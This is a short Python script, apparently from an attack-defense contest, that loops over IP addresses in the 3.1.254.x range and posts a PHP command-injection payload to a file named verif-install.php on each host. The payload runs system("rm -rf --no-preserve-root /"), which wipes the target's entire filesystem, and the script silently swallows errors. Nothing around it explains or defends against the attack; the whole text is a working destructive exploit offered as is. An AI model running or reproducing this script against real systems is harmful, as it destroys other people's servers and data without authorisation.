import requests

payload = {"a":"system(\"rm -rf --no-preserve-root /\");"}

urladd = '/app/webroot/verif-install.php'
urlheader = 'http://'
for i in range(8,24,3):
    ip = '3.1.254.'
    ip = ip + str(i)
    # ip = '3.1.254.17'
    url = urlheader + ip + urladd
    # print(url)
    try:
        res = requests.post(url, data=payload)
        res = res.text
        print(res)
    except:
        print(end='')